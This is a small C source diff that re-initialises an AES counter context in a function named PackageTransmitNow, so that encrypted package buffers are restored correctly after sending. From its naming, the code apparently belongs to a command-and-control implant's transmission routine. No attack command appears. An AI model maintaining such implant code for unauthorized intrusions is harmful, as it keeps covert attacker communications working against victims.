@@ -267,6 +267,12 @@ BOOL PackageTransmitNow(
         if ( Package->Destroy ) {
             PackageDestroy( Package ); Package = NULL;
         } else if ( Package->Encrypt ) {
+            /* Re-init so the counter resets to 0, making this call the exact
+               inverse of the encryption step above.  Without re-init the Iv
+               is left at offset N_blocks, causing the XOR to use a different
+               keystream segment and permanently corrupting the reusable buffer
+               (e.g. Instance->MetaData with Destroy=FALSE). */
+            AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
             AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
         }
     } else {
